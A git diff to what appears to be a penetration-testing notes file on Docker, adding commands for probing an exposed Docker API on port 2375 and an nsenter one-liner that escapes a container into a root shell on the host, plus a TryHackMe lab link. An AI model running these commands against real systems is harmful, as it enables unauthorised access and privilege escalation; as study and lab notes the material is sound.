@@ -78,7 +78,15 @@ For full list see [Commands](https://docs.docker.com/engine/reference/commandlin
 
 ## Docker Enumeration
 
-On target machine enumerate the lay of the land:
+Remote enumeration
+```bash
+nmap -sV -p 2375 $IP
+curl http://$IP:2375/version
+# Remote execution on the docker container
+docker -H tcp://$IP:2375 ps
+```
+
+Docker host and guest
 ```bash
 # Docker is utilitizable on a host machine?
 docker -H $remotehost $dockcmd
@@ -146,17 +154,25 @@ docker push
 
 ## Docker Escapes
 
-
-
 #### Shared Namespaces
 
-Namespaces segregate system resources. Have root access inside the container or potentially use [[pspy]]. Find a namespace:
+Namespaces segregate system resources, which on Linux assign to a namespace and process identifier.Every container will have unique namespace on the host machine. 
+
+Find a namespace:
 ```bash
+# Can we see namespaces from the host machine?
 ps aux
 ```
 We then mount the namespace of the process running outside of the container with a sh shell.
 ```bash
+# namespace enter
 nsenter --target $PID --mount sh
+# --target $NAMESPACE 
+# --mount # mount to the target namespace
+# --uts # Share the same UTS namespace as target
+# --ipc # Enter the Inter-process comunitcation namespace 
+# --net # enter the network namespace
+nsenter --target 1 --mount --uts --ipc --net /bin/bash
 ```
 
 #### Misconfigured Privileges
@@ -258,3 +274,4 @@ Netcat
 [Use the “no-new-privileges” security option](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/)
 [seccomp](https://docs.docker.com/engine/security/seccomp/)
 [AppArmor](https://docs.docker.com/engine/security/apparmor/)
+[THM Container Vulnerabilities](https://tryhackme.com/room/containervulnerabilitiesDG)
